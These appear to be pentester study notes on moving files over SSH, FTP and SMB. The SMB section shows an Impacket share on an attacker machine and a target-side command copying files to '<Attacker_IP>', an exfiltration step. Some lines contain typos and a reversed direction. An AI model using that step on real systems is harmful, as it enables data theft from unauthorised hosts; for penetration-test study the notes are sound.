# File Transfers

### SSH
 - `scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2` (`-r` for recersive)
 - copy local file to remote: `scp file.txt remote_username@10.10.0.2:/remote/directory`
 - copy remote file to local: `scp remote_username@10.10.0.2:/remote/file.txt /local/directory`
   
### FTP
 - Upload to server: `put c:\files\file1.txt`
 - Download from server: `get c:\files\file1.txt`
 - Upload multiple files: use `lcd` to traverse kali; then `put *.txt` to put all files to server
 - Downlod multiple files: use `lcd` to traverse kale; then `mget *.txt` to pull all files to server
   
### SMB
 - Follow SMB Client Cheet Sheet
 - Use Impacket-smbserver
1. mkdir smb
2. #Attacker: sudo impacket-smbserver -smb2support share $(pwd)
3. #Target: copy <my_files>.zip \\<Attacker_IP>\share;
4. Clean up smb shares (delete file and close connection)
